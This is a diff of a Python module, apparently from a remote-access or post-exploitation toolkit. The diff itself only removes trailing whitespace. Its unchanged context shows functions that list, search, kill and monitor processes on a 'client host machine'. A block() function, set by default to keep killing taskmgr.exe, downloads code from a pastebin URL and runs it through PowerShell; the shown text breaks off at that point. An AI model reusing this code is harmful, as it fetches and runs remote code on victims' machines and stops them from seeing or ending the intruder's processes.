@@ -18,7 +18,7 @@ import util
 packages  = ['wmi','pythoncom'] if os.name == 'nt' else []
 platforms = ['win32','linux2','darwin']
 usage = 'process <list/search/kill>'
-description = """ 
+description = """
 List/search/kill currently running processes on the client host machine
 """
 log = StringIO.StringIO()
@@ -55,7 +55,7 @@ def _monitor(keyword):
         util.log("{} error: {}".format(monitor.func_name, str(e2)))
 
 def list(*args, **kwargs):
-    """ 
+    """
     List currently running processes
 
     Returns process list as a dictionary (JSON) object
@@ -76,7 +76,7 @@ def list(*args, **kwargs):
         util.log("{} error: {}".format(list.func_name, str(e)))
 
 def search(keyword):
-    """ 
+    """
     Search currently running processes for a keyword
 
     `Required`
@@ -102,7 +102,7 @@ def search(keyword):
         util.log("{} error: {}".format(search.func_name, str(e)))
 
 def kill(process_id):
-    """ 
+    """
     Kill a running process with a given PID
 
     `Required`
@@ -132,7 +132,7 @@ def kill(process_id):
         util.log("{} error: {}".format(kill.func_name, str(e)))
 
 def monitor(keyword):
-    """ 
+    """
     Monitor the host machine for process creation with the given keyword in the name
 
     `Required`
@@ -145,7 +145,7 @@ def monitor(keyword):
     return t
 
 def block(process_name='taskmgr.exe'):
-    """ 
+    """
     Block a process from running by immediately killing it every time it spawns
 
     `Optional`
@@ -155,7 +155,7 @@ def block(process_name='taskmgr.exe'):
     try:
         code = urllib.urlopen('https://pastebin.com/raw/GYFAzpy3').read().replace('__PROCESS__', process_name)
         if os.path.isfile(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'):
-            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' 
+            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'
         elif os.path.isfile(os.popen('where powershell').read().rstrip()):
             powershell = os.popen('where powershell').read().rstrip()
         else:
